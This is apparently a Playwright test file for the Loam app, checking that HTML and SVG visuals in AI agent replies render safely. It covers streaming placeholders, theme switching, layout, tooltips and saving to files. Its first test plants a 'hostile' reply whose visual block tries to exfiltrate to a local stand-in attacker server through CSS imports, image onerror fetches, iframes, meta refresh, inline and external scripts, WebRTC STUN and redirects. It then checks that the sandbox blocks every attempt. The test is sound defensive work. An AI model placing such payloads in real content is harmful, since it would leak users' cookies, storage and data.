// Real-Chromium proof for inline visuals in agent replies:
//   1. seal_blocks_parent_dom_storage_and_all_network
//   2. streaming_placeholder_and_non_drawing_fallbacks
//   3. live_theme_mode_and_plugin_theme_recolouring
//   4. layout_no_chrome_hover_tooltip_expand_and_save_to_files
//
// Run:
//   LOAM_PLAYWRIGHT=.../playwright-core/index.mjs LOAM_CHROME=/usr/bin/chromium-headless-shell \
//     node test/reply-visuals-browser.mjs
import assert from 'node:assert/strict'
import http from 'node:http'
import dgram from 'node:dgram'
import fsp from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createApp } from '../src/server.js'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = path.resolve(HERE, '..', '..')
const FOUNDRY_CSS = await fsp.readFile(path.join(REPO, 'plugins/_listed/foundry/theme.css'), 'utf8')
const { chromium } = await import(process.env.LOAM_PLAYWRIGHT || 'playwright')

const COMPARISON_AND_CHART_REPLY = [
  'Here is how the three pour-over grinders stack up, followed by what four months of beans and café stops actually cost.',
  '',
  '```visual Pour-over grinders compared',
  '<style>',
  '  .pick { display:inline-block; padding:1px 7px; border-radius:var(--radius-pill); background:var(--persona-sage-tint); color:var(--paper-ink); font-size:var(--type-caption); font-weight:600; }',
  '  .num { text-align:right; white-space:nowrap; }',
  '  .bar-track { width:72px; height:6px; border-radius:var(--radius-pill); background:var(--paper-card); overflow:hidden; display:inline-block; vertical-align:middle; }',
  '  .bar-fill { height:100%; background:var(--signal-crema); border-radius:var(--radius-pill); }',
  '</style>',
  '<table>',
  '  <thead><tr><th>Grinder</th><th class="num">Price</th><th>Burr</th><th>Clarity</th><th>Best for</th></tr></thead>',
  '  <tbody>',
  '    <tr><td><strong>Fellow Ode Gen 2</strong> <span class="pick">Pick</span></td><td class="num">$345</td><td>64 mm flat</td><td><span class="bar-track" data-tip="Clarity: 9.2 / 10"><span class="bar-fill" style="width:92%"></span></span></td><td>Clean filter cups, quiet mornings</td></tr>',
  '    <tr><td><strong>Baratza Encore ESP</strong></td><td class="num">$199</td><td>40 mm conical</td><td><span class="bar-track" data-tip="Clarity: 7.4 / 10"><span class="bar-fill" style="width:74%"></span></span></td><td>Filter plus entry espresso</td></tr>',
  '    <tr><td><strong>Comandante C40</strong></td><td class="num">$295</td><td>39 mm hand</td><td><span class="bar-track" data-tip="Clarity: 8.8 / 10"><span class="bar-fill" style="width:88%"></span></span></td><td>Travel, zero counter footprint</td></tr>',
  '  </tbody>',
  '</table>',
  '```',
  '',
  'And the monthly spend alongside the $65 target:',
  '',
  '```visual Monthly coffee spend',
  '<figure>',
  '  <svg viewBox="0 0 460 156" role="img" aria-label="Monthly coffee spend July to October">',
  '    <line x1="92" y1="14" x2="92" y2="128" stroke="var(--paper-rule-strong)" />',
  '    <line x1="254" y1="14" x2="254" y2="128" stroke="var(--signal-crema)" stroke-dasharray="3 3" opacity="0.65" />',
  '    <text x="254" y="144" text-anchor="middle" fill="var(--paper-ink-3)" font-size="11">Target $65</text>',
  '    <g><text x="84" y="34" text-anchor="end" fill="var(--paper-ink-2)">July</text><rect class="bar" x="92" y="20" width="180" height="20" rx="4" fill="var(--persona-slate)"><title>July: $72</title></rect><text x="280" y="34" fill="var(--paper-ink-3)">$72</text></g>',
  '    <g><text x="84" y="64" text-anchor="end" fill="var(--paper-ink-2)">August</text><rect class="bar" x="92" y="50" width="235" height="20" rx="4" fill="var(--persona-teal)"><title>August: $94 (two bags + café)</title></rect><text x="335" y="64" fill="var(--paper-ink-3)">$94</text></g>',
  '    <g><text x="84" y="94" text-anchor="end" fill="var(--paper-ink-2)">September</text><rect class="bar" x="92" y="80" width="145" height="20" rx="4" fill="var(--persona-slate)"><title>September: $58</title></rect><text x="245" y="94" fill="var(--paper-ink-3)">$58</text></g>',
  '    <g><text x="84" y="124" text-anchor="end" fill="var(--paper-ink-2)">October</text><rect class="bar" x="92" y="110" width="160" height="20" rx="4" fill="var(--signal-crema)"><title>October: $64 (under target)</title></rect><text x="260" y="124" fill="var(--paper-ink)">$64</text></g>',
  '  </svg>',
  '  <figcaption>Whole beans plus café stops; October back under the $65 target.</figcaption>',
  '</figure>',
  '```',
  '',
  'And an ordinary HTML snippet still renders as code:',
  '',
  '```html',
  '<p class="keep-as-code">Hello</p>',
  '```',
].join('\n')

function makeFixture({ evilOrigin, udpPort }) {
  const savedFiles = []
  const streamClients = new Set()
  const hostileReply = [
    'Copied snippet test:',
    '',
    '```visual Hostile block',
    `<style>`,
    `  @import url("${evilOrigin}/from-import.css");`,
    `  @font-face { font-family: EvilFont; src: url("${evilOrigin}/from-font.woff2"); }`,
    `  .probe { font-family: EvilFont; background-image: url("${evilOrigin}/from-css.png"); color: var(--paper-ink); padding: 8px; }`,
    `</style>`,
    `<div class="probe" id="safe-text">Harmless label</div>`,
    `<img src="${evilOrigin}/from-img.png" onerror="fetch('${evilOrigin}/from-onerror')">`,
    `<svg width="20" height="20"><image href="${evilOrigin}/from-svg.png" width="20" height="20"/><use href="${evilOrigin}/sprite.svg#x"/></svg>`,
    `<link rel="stylesheet" href="${evilOrigin}/from-link.css">`,
    `<iframe src="${evilOrigin}/from-subframe"></iframe>`,
    `<meta http-equiv="refresh" content="0;url=${evilOrigin}/from-meta">`,
    `<script src="${evilOrigin}/from-ext-script.js"></script>`,
    `<script>`,
    `  window.parent.document.title = 'PWNED';`,
    `  fetch('${evilOrigin}/from-inline-script');`,
    `  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udpPort}' }] });`,
    `  pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));`,
    `  location.href = '${evilOrigin}/from-location';`,
    `</script>`,
    '```',
  ].join('\n')

  const threadRows = [
    {
      id: 't-visuals',
      title: 'Coffee grinders',
      default: 'iris',
      members: [{ persona: 'iris', engine: 'claude-code', model: null, running: false, busy: false }],
      last: { author: 'iris', text: COMPARISON_AND_CHART_REPLY.slice(0, 200), at: '2026-11-27T17:00:00Z' },
      unread: 0,
      pinned: false,
      archived: false,
      created: '2026-11-27T16:59:00Z',
    },
    {
      id: 't-hostile',
      title: 'Seal check',
      default: 'iris',
      members: [{ persona: 'iris', engine: 'claude-code', model: null, running: false, busy: false }],
      last: { author: 'iris', text: 'Visual: Hostile block', at: '2026-11-27T16:58:00Z' },
      unread: 0,
      pinned: false,
      archived: false,
      created: '2026-11-27T16:57:00Z',
    },
    {
      id: 't-stream',
      title: 'Streaming visual',
      default: 'iris',
      members: [{ persona: 'iris', engine: 'claude-code', model: null, running: false, busy: false }],
      last: { author: 'you', text: 'Show me a chart', at: '2026-11-27T16:56:00Z' },
      unread: 0,
      pinned: false,
      archived: false,
      created: '2026-11-27T16:55:00Z',
    },
  ]

  const messagesByThread = {
    't-visuals': [
      { id: 'm1', author: 'you', kind: 'message', text: 'Compare three pour-over grinders and chart my monthly coffee spend.', at: '2026-11-27T16:59:30Z' },
      { id: 'm2', author: 'iris', kind: 'message', text: COMPARISON_AND_CHART_REPLY, at: '2026-11-27T17:00:00Z' },
    ],
    't-hostile': [
      { id: 'm1', author: 'you', kind: 'message', text: 'Test hostile visual', at: '2026-11-27T16:57:30Z' },
      { id: 'm2', author: 'iris', kind: 'message', text: hostileReply, at: '2026-11-27T16:58:00Z' },
    ],
    't-stream': [
      { id: 'm1', author: 'you', kind: 'message', text: 'Show me a chart', at: '2026-11-27T16:56:00Z' },
    ],
  }

  let appearance = {
    phone: { mode: 'light', transition: 'normal', size: 100, theme: 'latte' },
    desktop: { mode: 'light', transition: 'normal', size: 90, theme: 'latte' },
  }

  const agents = [{ id: 'iris', name: 'Iris', display: 'Iris', initial: 'I', color: 'sage', archived: false }]
  const plugins = [
    { id: 'latte', name: 'Latte & Newspaper', author: 'Loam contributors', version: '1.0.0', api: 0, layer: 'shipped', effective: true, broken: false, kind: ['theme'] },
    { id: 'plain', name: 'Plain', author: 'Loam contributors', version: '1.0.0', api: 0, layer: 'shipped', effective: true, broken: false, kind: ['theme'] },
    { id: 'foundry', name: 'Foundry', author: 'Loam contributors', version: '1.0.0', api: 0, layer: 'installed', effective: true, broken: false, kind: ['theme'] },
  ]

  const broker = {
    async json(method, reqPath, body) {
      const [p, qs] = reqPath.split('?')
      const params = new URLSearchParams(qs || '')
      if (p === '/v1/plugins') return { status: 200, contentType: 'application/json', body: JSON.stringify({ plugins }) }
      if (p === '/v1/settings/appearance') {
        if (method === 'PATCH' && body) {
          if (body.desktop) appearance.desktop = { ...appearance.desktop, ...body.desktop }
          if (body.phone) appearance.phone = { ...appearance.phone, ...body.phone }
        }
        return { status: 200, contentType: 'application/json', body: JSON.stringify(appearance) }
      }
      if (p === '/v1/settings') return { status: 200, contentType: 'application/json', body: JSON.stringify({ composer: { send_key: 'enter' } }) }
      if (p === '/v1/agents') return { status: 200, contentType: 'application/json', body: JSON.stringify({ agents }) }
      if (p === '/v1/providers') return { status: 200, contentType: 'application/json', body: JSON.stringify({ providers: [{ id: 'claude-code', name: 'Claude Code', available: true }] }) }
      if (p === '/v1/threads' && method === 'GET') return { status: 200, contentType: 'application/json', body: JSON.stringify({ threads: threadRows, agents }) }
      const tm = /^\/v1\/threads\/([^/]+)$/.exec(p)
      if (tm && method === 'GET') {
        const id = decodeURIComponent(tm[1])
        const thread = threadRows.find((t) => t.id === id)
        if (!thread) return { status: 404, contentType: 'application/json', body: JSON.stringify({ error: 'missing' }) }
        return { status: 200, contentType: 'application/json', body: JSON.stringify({ thread, messages: messagesByThread[id] || [], has_more: false, turn: null, turns: [] }) }
      }
      if (p === '/v1/threads/t-visuals/steps' || /^\/v1\/threads\/[^/]+\/steps$/.test(p)) {
        return { status: 404, contentType: 'application/json', body: JSON.stringify({ error: 'none' }) }
      }
      if (p === '/v1/files/roots') {
        return { status: 200, contentType: 'application/json', body: JSON.stringify({ roots: [{ id: 'vault', name: 'Your files' }], shortcuts: [] }) }
      }
      if (p === '/v1/files/stat' || p === '/v1/files/read' || p === '/v1/files/text') {
        const filePath = params.get('path') || ''
        if (filePath === 'Notes/with-visual.md') {
          const text = '# Notes\n\n' + COMPARISON_AND_CHART_REPLY
          return {
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              root: 'vault', path: filePath, name: 'with-visual.md', kind: 'file', view: 'markdown',
              size: text.length, revision: 'r1', text, capabilities: { read: true, download: true, write: false },
            }),
          }
        }
        const saved = savedFiles.find((f) => f.path === filePath)
        if (saved) {
          return {
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              root: 'vault', path: saved.path, name: path.basename(saved.path), kind: 'file', view: 'html',
              size: saved.text.length, revision: 'r1', text: saved.text, capabilities: { read: true, download: true, write: true },
            }),
          }
        }
        return { status: 404, contentType: 'application/json', body: JSON.stringify({ error: 'not found' }) }
      }
      if (p === '/v1/files/resolve') {
        const ref = params.get('ref') || ''
        const cleaned = ref.replace(/^\/files\/vault\//, '').split('/').map(decodeURIComponent).join('/')
        const saved = savedFiles.find((f) => f.path === cleaned)
        if (saved) {
          return {
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              status: 'resolved',
              row: { root: 'vault', path: saved.path, name: path.basename(saved.path), kind: 'file', view: 'html', capabilities: { read: true, download: true, write: true } },
            }),
          }
        }
        return { status: 404, contentType: 'application/json', body: JSON.stringify({ error: 'not found' }) }
      }
      if (p === '/v1/files/file' && method === 'POST') {
        savedFiles.push({ root: body.root, path: body.path, text: body.text })
        return {
          status: 201,
          contentType: 'application/json',
          body: JSON.stringify({ root: body.root, path: body.path, name: path.basename(body.path), kind: 'file', view: 'html', revision: 'r1' }),
        }
      }
      if (p === '/v1/files/folder' && method === 'POST') {
        return { status: 201, contentType: 'application/json', body: JSON.stringify({ root: body.root, path: body.path, kind: 'folder' }) }
      }
      if (p === '/v1/activity' || p === '/v1/running' || p === '/v1/apps' || p === '/v1/status' || p === '/v1/health') {
        return { status: 200, contentType: 'application/json', body: JSON.stringify({ items: [], running: [], apps: [], ok: true }) }
      }
      return { status: 200, contentType: 'application/json', body: '{}' }
    },
    async health() { return { ok: true, status: 200, body: { ok: true } } },
    async file(reqPath) {
      if (reqPath === '/v1/plugins/foundry/files/theme.css') {
        const { Readable } = await import('node:stream')
        return { status: 200, contentType: 'text/css; charset=utf-8', stream: Readable.from([Buffer.from(FOUNDRY_CSS)]) }
      }
      return { status: 404, contentType: 'application/json', stream: null }
    },
    stream(reqPath) {
      const { EventEmitter } = globalThis
      const listeners = new Map()
      const client = {
        path: reqPath,
        emit(event) {
          for (const fn of listeners.get('data') || []) fn(Buffer.from(`data: ${JSON.stringify(event)}\n\n`))
        },
        close() {
          streamClients.delete(client)
          for (const fn of listeners.get('end') || []) fn()
        },
      }
      const resStream = {
        statusCode: 200,
        headers: { 'content-type': 'text/event-stream' },
        on(ev, fn) {
          if (!listeners.has(ev)) listeners.set(ev, new Set())
          listeners.get(ev).add(fn)
          return resStream
        },
        once(ev, fn) {
          const wrap = (...a) => { listeners.get(ev)?.delete(wrap); fn(...a) }
          return resStream.on(ev, wrap)
        },
        pipe(dest) {
          this.on('data', (chunk) => dest.write(chunk))
          this.on('end', () => dest.end())
          return dest
        },
        destroy() { streamClients.delete(client) },
      }
      streamClients.add(client)
      setTimeout(() => {
        if (reqPath.includes('/t-stream/events')) {
          client.emit({ type: 'thread.snapshot', thread: threadRows[2], members: threadRows[2].members, turns: [] })
        } else if (reqPath.includes('/threads/events')) {
          client.emit({ type: 'threads.snapshot', threads: threadRows })
        } else {
          client.emit({ type: 'thread.snapshot', members: threadRows[0].members, turns: [] })
        }
      }, 20)
      return Promise.resolve({ ok: true, status: 200, stream: resStream })
    },
    openStream(reqPath) { return this.stream(reqPath) },
  }

  function pushStreamEvent(match, event) {
    for (const c of streamClients) if (c.path.includes(match)) c.emit(event)
  }

  return { broker, savedFiles, pushStreamEvent }
}

// Start attacker HTTP + UDP servers.
const evilHits = []
const evilServer = http.createServer((req, res) => {
  evilHits.push(req.url)
  res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' })
  res.end('LEAKED')
})
await new Promise((r) => evilServer.listen(0, '127.0.0.1', r))
const evilOrigin = `http://127.0.0.1:${evilServer.address().port}`

const udpHits = []
const udpServer = dgram.createSocket('udp4')
udpServer.on('message', (_msg, rinfo) => udpHits.push(rinfo))
await new Promise((r) => udpServer.bind(0, '127.0.0.1', r))
const udpPort = udpServer.address().port

const fixture = makeFixture({ evilOrigin, udpPort })
const app = createApp({ broker: fixture.broker })
await new Promise((r) => app.server.listen(0, '127.0.0.1', r))
const appOrigin = `http://127.0.0.1:${app.server.address().port}`

const browser = await chromium.launch({
  executablePath: process.env.LOAM_CHROME || '/usr/bin/chromium-headless-shell',
  headless: true,
  args: ['--no-sandbox', '--disable-dev-shm-usage'],
})

async function waitVisualReady(page, selector = '.reply-visual-frame', index = 0) {
  await page.waitForFunction(({ sel, idx }) => {
    const el = document.querySelectorAll(sel)[idx]
    return Boolean(el && !el.classList.contains('loading') && el.getBoundingClientRect().height > 30)
  }, { sel: selector, idx: index }, { timeout: 10000 })
}

try {
  // ------------------------------------------------------------------ Test 1
  {
    const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: 'light' })
    await context.addCookies([{ name: 'session', value: 'topsecret-cookie', url: appOrigin }])
    const page = await context.newPage()
    page.setDefaultTimeout(12000)
    await page.goto(`${appOrigin}/threads/t-hostile`)
    await page.evaluate(() => {
      localStorage.setItem('secret', 'topsecret-ls')
      sessionStorage.setItem('secret', 'topsecret-ss')
    })
    await waitVisualReady(page)
    await page.waitForTimeout(500)

    assert.equal(await page.title(), 'Loam', 'hostile visual must not alter parent document.title')
    assert.equal(await page.evaluate(() => localStorage.getItem('secret')), 'topsecret-ls')
    assert.equal(await page.evaluate(() => sessionStorage.getItem('secret')), 'topsecret-ss')
    assert.deepEqual(evilHits, [], 'hostile visual must produce zero HTTP requests to attacker')
    assert.equal(udpHits.length, 0, 'hostile visual must produce zero WebRTC STUN UDP packets')

    // Directly exercise the browser's sandbox & CSP inside the live visual iframe.
    const visualFrame = page.frames().find((f) => f.url().includes('/visual-frame.html'))
    assert.ok(visualFrame, 'visual iframe is mounted')
    assert.equal(await visualFrame.locator('#safe-text').textContent(), 'Harmless label')
    const directSeal = await visualFrame.evaluate(async (evil) => {
      const out = {}
      try { void window.parent.document.title; out.parentDoc = 'ALLOWED' } catch (e) { out.parentDoc = e.name }
      try { void document.cookie; out.cookie = 'ALLOWED' } catch (e) { out.cookie = e.name }
      try { void localStorage.getItem('secret'); out.ls = 'ALLOWED' } catch (e) { out.ls = e.name }
      try { void sessionStorage.getItem('secret'); out.ss = 'ALLOWED' } catch (e) { out.ss = e.name }
      try { await fetch(`${evil}/direct-fetch`); out.fetch = 'ALLOWED' } catch (e) { out.fetch = e.name }
      const img = document.createElement('img')
      img.src = `${evil}/direct-img.png`
      document.body.appendChild(img)
      const st = document.createElement('style')
      st.textContent = `@font-face { font-family: DirectEvil; src: url("${evil}/direct-font.woff2"); } .d { background-image: url("${evil}/direct-css.png"); font-family: DirectEvil; }`
      document.head.appendChild(st)
      const d = document.createElement('div')
      d.className = 'd'; d.textContent = 'x'
      document.body.appendChild(d)
      const sc1 = document.createElement('script')
      sc1.src = `${evil}/direct-script.js`
      document.body.appendChild(sc1)
      const sc2 = document.createElement('script')
      sc2.textContent = 'window.__unnoncedInlineRan = true;'
      document.body.appendChild(sc2)
      await new Promise((r) => setTimeout(r, 350))
      out.unnoncedInlineRan = Boolean(window.__unnoncedInlineRan)
      return out
    }, evilOrigin)

    assert.equal(directSeal.parentDoc, 'SecurityError')
    assert.equal(directSeal.cookie, 'SecurityError')
    assert.equal(directSeal.ls, 'SecurityError')
    assert.equal(directSeal.ss, 'SecurityError')
    assert.equal(directSeal.fetch, 'TypeError')
    assert.equal(directSeal.unnoncedInlineRan, false, 'script-src nonce blocks injected inline scripts')
    assert.deepEqual(evilHits, [], 'direct fetch/img/css/font/script inside frame all hit zero network URLs')
    await context.close()
    console.log('PASS  seal_blocks_parent_dom_storage_and_all_network')
  }

  // ------------------------------------------------------------------ Test 2
  {
    const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: 'light' })
    const page = await context.newPage()
    page.setDefaultTimeout(12000)
    await page.goto(`${appOrigin}/threads/t-stream`)
    await page.waitForSelector('.tt-message[data-message-id="m1"]')

    // Stream an unfinished visual block -> must show calm placeholder, never raw HTML.
    fixture.pushStreamEvent('/t-stream/events', { type: 'turn.started', persona: 'iris' })
    fixture.pushStreamEvent('/t-stream/events', {
      type: 'message.delta',
      persona: 'iris',
      draft: 'Checking the numbers.\n\n```visual Quarterly pace\n<table><tr><td>Q1</td><td>42</td>',
    })
    await page.waitForSelector('.reply-visual-streaming')
    const placeholderText = await page.locator('.reply-visual-streaming').textContent()
    assert.equal(placeholderText, 'Drawing Quarterly pace…')
    assert.equal(await page.locator('.reply-visual-frame').count(), 0)
    assert.ok(!(await page.locator('.tt-stream').textContent()).includes('<table'))

    // Close the fence while still streaming trailing prose -> live visual mounts & auto-sizes.
    fixture.pushStreamEvent('/t-stream/events', {
      type: 'message.delta',
      persona: 'iris',
      draft: 'Checking the numbers.\n\n```visual Quarterly pace\n<table><thead><tr><th>Quarter</th><th>Total</th></tr></thead><tbody><tr><td>Q1</td><td>42</td></tr></tbody></table>\n```\n\nStill finishing the note…',
    })
    await waitVisualReady(page)
    assert.equal(await page.locator('.reply-visual-streaming').count(), 0)
    const frameSrcBeforeDone = await page.locator('.reply-visual-frame').first().getAttribute('src')

    // Message finishes -> exact same iframe kept without reload.
    fixture.pushStreamEvent('/t-stream/events', {
      type: 'message.done',
      message: {
        id: 'm2',
        author: 'iris',
        kind: 'message',
        at: '2026-11-27T17:01:00Z',
        text: 'Checking the numbers.\n\n```visual Quarterly pace\n<table><thead><tr><th>Quarter</th><th>Total</th></tr></thead><tbody><tr><td>Q1</td><td>42</td></tr></tbody></table>\n```\n\nDone.',
      },
    })
    await page.waitForSelector('.tt-message[data-message-id="m2"]')
    assert.equal(await page.locator('.reply-visual-frame').first().getAttribute('src'), frameSrcBeforeDone)

    // Classic Markdown view in Files renders collapsed fallback, never raw markup wall.
    await page.goto(`${appOrigin}/files/vault/Notes/with-visual.md`)
    await page.waitForSelector('.md-visual-fallback')
    const fbCount = await page.locator('.md-visual-fallback').count()
    assert.equal(fbCount, 2)
    assert.equal(await page.locator('.md-visual-fallback[open]').count(), 0)
    assert.match(await page.locator('.md-visual-fallback-title').first().textContent(), /Visual · Pour-over grinders compared/)

    await context.close()
    console.log('PASS  streaming_placeholder_and_non_drawing_fallbacks')
  }

  // ------------------------------------------------------------------ Test 3
  {
    const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: 'light' })
    const page = await context.newPage()
    page.setDefaultTimeout(12000)
    await page.goto(`${appOrigin}/threads/t-visuals`)
    await waitVisualReady(page, '.reply-visual-frame', 0)
    await waitVisualReady(page, '.reply-visual-frame', 1)

    const getVisualColors = async () => {
      const f = page.frames().find((fr) => fr.url().includes('/visual-frame.html'))
      return f.evaluate(() => {
        const s = getComputedStyle(document.documentElement)
        const td = document.querySelector('tbody td')
        return {
          mode: document.documentElement.dataset.theme,
          ink: td ? getComputedStyle(td).color : '',
          crema: s.getPropertyValue('--signal-crema').trim(),
          pill: s.getPropertyValue('--radius-pill').trim(),
          fontBody: s.getPropertyValue('--font-body').trim(),
        }
      })
    }

    const beforeLight = await getVisualColors()
    assert.equal(beforeLight.mode, 'light')
    assert.equal(beforeLight.crema.toLowerCase(), '#b4733a')

    // Switch light -> dark live with the visual already on screen (no reload!).
    const srcBefore = await page.locator('.reply-visual-frame').first().getAttribute('src')
    await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
    await page.waitForFunction(() => true)
    await page.waitForTimeout(200)
    const afterDark = await getVisualColors()
    assert.equal(afterDark.mode, 'dark')
    assert.equal(afterDark.crema.toLowerCase(), '#d89a5b')
    assert.notEqual(afterDark.ink, beforeLight.ink)
    assert.equal(await page.locator('.reply-visual-frame').first().getAttribute('src'), srcBefore, 'theme switch updates in-place without iframe reload')
    // Parent <iframe> element must match the inner document's color-scheme so
    // Chromium keeps the iframe backdrop transparent even on a light OS.
    assert.equal(
      await page.evaluate(() => getComputedStyle(document.querySelector('.reply-visual-frame')).colorScheme),
      'dark',
      'iframe element color-scheme tracks dark mode so backdrop stays transparent',
    )

    // Switch to non-default built-in theme `plain`.
    await page.evaluate(() => { document.documentElement.dataset.look = 'plain'; document.documentElement.dataset.theme = 'light' })
    await page.waitForTimeout(200)
    const inPlain = await getVisualColors()
    assert.equal(inPlain.crema.toLowerCase(), '#5e5e5e')

    // Switch to installed plugin theme `foundry` (from /themes.css!).
    await page.evaluate(() => { document.documentElement.dataset.look = 'foundry'; document.documentElement.dataset.theme = 'light' })
    await page.waitForTimeout(200)
    const inFoundry = await getVisualColors()
    assert.equal(inFoundry.crema.toLowerCase(), '#3f5d74')
    assert.equal(inFoundry.pill, '8px')

    await context.close()
    console.log('PASS  live_theme_mode_and_plugin_theme_recolouring')
  }

  // ------------------------------------------------------------------ Test 4
  {
    for (const width of [390, 1440]) {
      const context = await browser.newContext({
        viewport: { width, height: width === 390 ? 844 : 900 },
        colorScheme: 'light',
        isMobile: width === 390,
        hasTouch: width === 390,
      })
      const page = await context.newPage()
      page.setDefaultTimeout(12000)
      await page.goto(`${appOrigin}/threads/t-visuals`)
      await waitVisualReady(page, '.reply-visual-frame', 0)
      await waitVisualReady(page, '.reply-visual-frame', 1)

      // Zero horizontal page overflow.
      const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth)
      assert.equal(overflow, false, `no sideways overflow at ${width}px`)

      // Zero border chrome on wrapper and zero inner vertical scrollbar on both visuals.
      const visualsCheck = await page.evaluate(() => {
        return [...document.querySelectorAll('.reply-visual')].map((v) => {
          const s = getComputedStyle(v)
          const f = v.querySelector('.reply-visual-frame')
          return {
            border: s.borderTopWidth,
            bg: s.backgroundColor,
            frameHeight: f?.getBoundingClientRect().height || 0,
          }
        })
      })
      assert.equal(visualsCheck.length, 2)
      for (const vc of visualsCheck) {
        assert.equal(vc.border, '0px', 'no border chrome added by Loam')
        assert.equal(vc.bg, 'rgba(0, 0, 0, 0)', 'no card background added by Loam')
        assert.ok(vc.frameHeight > 80, `auto-sized height at ${width}px: ${vc.frameHeight}`)
      }

      // Verify zero inner vertical overflow inside every visual iframe.
      const visualFrames = page.frames().filter((f) => f.url().includes('/visual-frame.html'))
      assert.equal(visualFrames.length, 2)
      for (const vf of visualFrames) {
        const scrollCheck = await vf.evaluate(() => ({
          scrollH: document.documentElement.scrollHeight,
          clientH: document.documentElement.clientHeight,
        }))
        assert.ok(scrollCheck.scrollH <= scrollCheck.clientH + 3, `no inner vertical scrollbar at ${width}px: ${JSON.stringify(scrollCheck)}`)
      }

      // Ordinary ```html block still rendered as <pre><code>.
      assert.match(await page.locator('.tt-message[data-message-id="m2"] pre code.lang-html').textContent(), /keep-as-code/)

      if (width === 1440) {
        // Test declarative SVG <title> hover tooltip inside the chart frame
        // using real screen coordinates (desktop uses body zoom: 0.9).
        const chartFrame = visualFrames[1]
        const frameRect = await page.evaluate(() => {
          const f = document.querySelectorAll('.reply-visual-frame')[1]
          const r = f.getBoundingClientRect()
          return { x: r.x, y: r.y, zoom: parseFloat(getComputedStyle(document.body).zoom) || 1 }
        })
        const barBox = await chartFrame.evaluate(() => {
          const r = document.querySelectorAll('rect.bar')[1].getBoundingClientRect()
          return { x: r.x, y: r.y, w: r.width, h: r.height }
        })
        await page.mouse.move(
          frameRect.x + (barBox.x + barBox.w / 2) * frameRect.zoom,
          frameRect.y + (barBox.y + barBox.h / 2) * frameRect.zoom,
        )
        await chartFrame.waitForSelector('#loam-tip:not([hidden])')
        assert.equal(await chartFrame.locator('#loam-tip').textContent(), 'August: $94 (two bags + café)')

        // Hover reveals Expand & Save to Files, clicking Expand opens dialog, Escape closes it.
        const firstVisual = page.locator('.reply-visual').first()
        await firstVisual.hover()
        await firstVisual.locator('.reply-visual-action', { hasText: 'Expand' }).click()
        await page.waitForSelector('dialog.visual-view[open]')
        await waitVisualReady(page, '.visual-view .reply-visual-frame', 0)
        await page.keyboard.press('Escape')
        assert.equal(await page.locator('dialog.visual-view').count(), 0)

        // Clicking Save to Files creates standalone HTML file in vault via POST /api/files/file.
        const beforeSaved = fixture.savedFiles.length
        await firstVisual.hover()
        await firstVisual.locator('.reply-visual-action', { hasText: 'Save to Files' }).click()
        await firstVisual.locator('.reply-visual-action', { hasText: 'Open in Files' }).waitFor()
        assert.equal(fixture.savedFiles.length, beforeSaved + 1)
        assert.match(fixture.savedFiles.at(-1).path, /Pour-over grinders compared\.html$/)
        assert.match(fixture.savedFiles.at(-1).text, /Fellow Ode Gen 2/)
        assert.ok(!fixture.savedFiles.at(-1).text.includes('<script'))
      }

      await context.close()
    }
    console.log('PASS  layout_no_chrome_hover_tooltip_expand_and_save_to_files')
  }
} finally {
  await browser.close()
  app.server.close()
  evilServer.close()
  udpServer.close()
}
